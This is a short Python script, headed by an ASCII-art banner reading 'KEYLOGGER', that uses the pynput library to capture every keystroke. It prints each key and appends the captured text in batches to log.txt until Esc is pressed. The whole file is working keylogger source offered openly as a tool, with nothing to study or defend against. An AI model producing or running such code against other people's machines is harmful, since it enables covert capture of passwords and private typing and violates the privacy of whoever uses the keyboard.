import pynput

from pynput.keyboard import Key, Listener
print ("""
 __    __  ________  __      __  __         ______    ______    ______   ________  _______  
/  |  /  |/        |/  \    /  |/  |       /      \  /      \  /      \ /        |/       \ 
$$ | /$$/ $$$$$$$$/ $$  \  /$$/ $$ |      /$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$$$/ $$$$$$$  |
$$ |/$$/  $$ |__     $$  \/$$/  $$ |      $$ |  $$ |$$ | _$$/ $$ | _$$/ $$ |__    $$ |__$$ |
$$  $$<   $$    |     $$  $$/   $$ |      $$ |  $$ |$$ |/    |$$ |/    |$$    |   $$    $$< 
$$$$$  \  $$$$$/       $$$$/    $$ |      $$ |  $$ |$$ |$$$$ |$$ |$$$$ |$$$$$/    $$$$$$$  |
$$ |$$  \ $$ |_____     $$ |    $$ |_____ $$ \__$$ |$$ \__$$ |$$ \__$$ |$$ |_____ $$ |  $$ |
$$ | $$  |$$       |    $$ |    $$       |$$    $$/ $$    $$/ $$    $$/ $$       |$$ |  $$ |
$$/   $$/ $$$$$$$$/     $$/     $$$$$$$$/  $$$$$$/   $$$$$$/   $$$$$$/  $$$$$$$$/ $$/   $$/ 
                                                                                            
                                                                                            
                                                                                            
 _______   __      __     ______   __                            __  __                     
/       \ /  \    /  |   /      \ /  |                          /  |/  |                    
$$$$$$$  |$$  \  /$$/__ /$$$$$$  |$$ |____    ______    ______  $$ |$$/   ______            
$$ |__$$ | $$  \/$$//  |$$ |  $$/ $$      \  /      \  /      \ $$ |/  | /      \           
$$    $$<   $$  $$/ $$/ $$ |      $$$$$$$  | $$$$$$  |/$$$$$$  |$$ |$$ |/$$$$$$  |          
$$$$$$$  |   $$$$/   __ $$ |   __ $$ |  $$ | /    $$ |$$ |  $$/ $$ |$$ |$$    $$ |          
$$ |__$$ |    $$ |  /  |$$ \__/  |$$ |  $$ |/$$$$$$$ |$$ |      $$ |$$ |$$$$$$$$/           
$$    $$/     $$ |  $$/ $$    $$/ $$ |  $$ |$$    $$ |$$ |      $$ |$$ |$$       |          
$$$$$$$/      $$/        $$$$$$/  $$/   $$/  $$$$$$$/ $$/       $$/ $$/  $$$$$$$/           
                                                                                            
                                                                                            
                                                                                            
""")
count = 0
keys = []

def on_press(key):
    global keys,count

    keys.append(key)
    count += 1
    print("{} pressed".format(key))


    if count >= 10:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
       return False

with Listener(on_press=on_press, on_release= on_release) as listener:
    listener.join()
